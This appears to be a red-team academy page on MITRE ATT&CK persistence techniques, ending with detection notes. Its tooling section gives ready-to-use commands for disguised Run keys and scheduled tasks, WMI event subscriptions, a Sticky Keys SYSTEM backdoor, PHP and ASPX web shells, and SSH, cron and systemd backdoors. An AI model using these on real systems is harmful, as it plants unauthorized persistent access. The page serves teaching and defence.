---
layout: training-page
title: "TA0003 — Persistence — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - persistence
  - registry
  - scheduled-tasks
  - wmi
page_key: "mitre-ta0003"
render_with_liquid: false
---

# TA0003 — Persistence

Persistence techniques allow adversaries to maintain their foothold across reboots, credential changes, and user logoffs. A well-placed persistence mechanism ensures that even if the initial payload is detected and removed, the adversary can reestablish access. Modern red team engagements test persistence specifically because defenders often focus on initial detection but leave persistence cleanup gaps.

The challenge in persistence is balancing stealth with reliability — highly visible mechanisms (obvious registry keys, named scheduled tasks) get caught, while stealthy mechanisms (WMI subscriptions, COM hijacking) are often overlooked during incident response.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1547 | Boot/Logon Autostart Execution | T1547.001 Registry Run Keys | HKCU\...\Run, HKLM\...\Run |
| T1547 | Boot/Logon Autostart Execution | T1547.004 Winlogon Helper | Winlogon key — runs at login |
| T1547 | Boot/Logon Autostart Execution | T1547.005 Security Support Provider | SSP DLL loaded by LSASS — survives reboots |
| T1547 | Boot/Logon Autostart Execution | T1547.009 Shortcut Modification | Startup folder LNK file |
| T1547 | Boot/Logon Autostart Execution | T1547.014 Active Setup | HKLM\SOFTWARE\Microsoft\Active Setup |
| T1543 | Create/Modify System Process | T1543.003 Windows Service | Registered service with malicious binary |
| T1546 | Event Triggered Execution | T1546.003 WMI Event Subscription | Fileless, survives reboots, hard to spot |
| T1546 | Event Triggered Execution | T1546.008 Accessibility Features | Sticky Keys / Utilman debug shell |
| T1546 | Event Triggered Execution | T1546.012 Image File Execution Options | IFEO debugger hijack — attach to process |
| T1546 | Event Triggered Execution | T1546.013 PowerShell Profile | $PROFILE executes on every PS session |
| T1053 | Scheduled Task/Job | T1053.005 Scheduled Task | schtasks — most common Windows persistence |
| T1053 | Scheduled Task/Job | T1053.003 Cron | Linux/macOS cron jobs |
| T1505 | Server Software Component | T1505.003 Web Shell | PHP/ASPX web shell on compromised web server |
| T1505 | Server Software Component | T1505.004 IIS Components | IIS native module (.dll) persistence |
| T1136 | Create Account | T1136.001 Local Account | Hidden local admin account |
| T1136 | Create Account | T1136.002 Domain Account | Backdoor AD account in privileged group |
| T1098 | Account Manipulation | T1098.002 Email Delegate Permissions | O365 inbox delegate for email access |
| T1098 | Account Manipulation | T1098.004 SSH Authorized Keys | Add attacker's SSH public key to ~/.ssh/authorized_keys |
| T1574 | Hijack Execution Flow | T1574.001 DLL Search Order Hijacking | Plant DLL in directory searched before System32 |
| T1574 | Hijack Execution Flow | T1574.002 DLL Side-Loading | Drop malicious DLL next to signed app |
| T1037 | Boot/Logon Init Scripts | T1037.001 Logon Script (Windows) | UserInitMprLogonScript registry value |
| T1176 | Browser Extensions | — | Malicious Chrome/Firefox extension via policy |

## Red Team Tooling

### Registry Run Keys

```
# Current user run key (persists for this user, no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "WindowsUpdater" /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f

# System-wide run key (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "SecurityHealth" /t REG_SZ /d "C:\ProgramData\health.exe" /f

# PowerShell run key (encoded to avoid logging)
$cmd = "powershell.exe -w hidden -EncodedCommand BASE64"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" \
  -Name "Update" -Value $cmd
```

### Scheduled Tasks

```
# Persistent scheduled task — runs every hour as SYSTEM
schtasks /create /tn "\Microsoft\Windows\Maintenance\Update" \
  /tr "C:\Windows\Temp\beacon.exe" /sc HOURLY /ru SYSTEM /f

# Trigger on user logon (any user)
schtasks /create /tn "\Microsoft\Windows\Shell\Startup" \
  /tr "powershell.exe -ep bypass -w hidden -c IEX(...)" \
  /sc ONLOGON /f

# Remote task creation (Impacket)
python3 schtask.py DOMAIN/user:pass@TARGET -action create \
  -name "WinUpdate" -command "C:\Windows\Temp\beacon.exe"
```

### WMI Event Subscription (Fileless)

```
# Create WMI permanent event subscription (fires every 60 seconds)
$FilterArgs = @{
    Name = 'UpdateChecker';
    EventNamespace = 'root\cimv2';
    QueryLanguage = 'WQL';
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'UpdateHandler';
    CommandLineTemplate = 'powershell.exe -ep bypass -w hidden -c "IEX(...)"'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter; Consumer = $Consumer
}
```

### Accessibility Feature Backdoor (IFEO)

```
# Sticky Keys backdoor — spawn cmd.exe as SYSTEM from lock screen
# Method 1: Replace sethc.exe with cmd.exe copy
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y

# Method 2: IFEO debugger (less obvious — doesn't modify sethc.exe)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" \
  /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# Now press Shift 5x at lock screen → SYSTEM cmd.exe
```

### Web Shell Deployment

```
# Simple PHP web shell (upload via file upload vuln or write via SQL injection)
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/wp-content/uploads/health.php

# ASPX web shell (IIS)
# Upload: <%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>

# Invoke-WebShell (PowerShell to push file via SMB)
Copy-Item payload.aspx \\TARGET\c$\inetpub\wwwroot\update.aspx
```

### Linux Persistence

```
# Cron job — runs every minute as root
echo "* * * * * root /tmp/.bash_update" >> /etc/crontab

# SSH authorized_keys backdoor
echo "ssh-rsa ATTACKER_PUBLIC_KEY attacker" >> /home/user/.ssh/authorized_keys

# /etc/rc.local (legacy but works on many distros)
echo "/tmp/.sshd &" >> /etc/rc.local

# systemd service (more modern)
cat > /etc/systemd/system/network-monitor.service << EOF
[Unit]
Description=Network Monitor Service
[Service]
ExecStart=/tmp/.monitor
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable network-monitor && systemctl start network-monitor
```

## Detection Notes

- **Registry run keys**: Autoruns (Sysinternals) and EDR startup monitors enumerate these; Event IDs 4657 (registry value modified) and Sysmon Event 13 (registry value set)
- **Scheduled tasks**: Event ID 4698 (task created), 4702 (task modified), 4699 (task deleted); task XML review for suspicious commands
- **WMI subscriptions**: Event IDs 5857/5860/5861; `Get-WMIObject -Namespace root\subscription -Class __EventFilter` to enumerate
- **Services**: Event ID 7045 (new service installed); sc.exe query to list all services; watch for services with random names or paths in temp directories
- **Web shells**: web access logs for unusual requests (cmd= GET parameter), file system monitoring for new PHP/ASPX files in web roots
- **Account creation**: Event ID 4720 (user account created), 4728 (member added to security-enabled global group)

## Related Academy Pages

- [AD Persistence](/active-directory/ad-persistence/)
- [Linux Persistence Techniques](/post-exploitation/linux-persistence/)
- [DLL Hijacking](/evasion/dll-hijacking/)
- [Process Injection & DLL Hijacking](/exploitation/process-injection/)
- [APC Injection](/evasion/apc-injection/)
- [Azure Persistence](/active-directory/azure-persistence/)

## Resources

- [TA0003 — MITRE ATT&CK Persistence](https://attack.mitre.org/tactics/TA0003/)
- [T1547 — Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547/)
- [T1546 — Event Triggered Execution](https://attack.mitre.org/techniques/T1546/)
- [Autoruns for Windows — Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
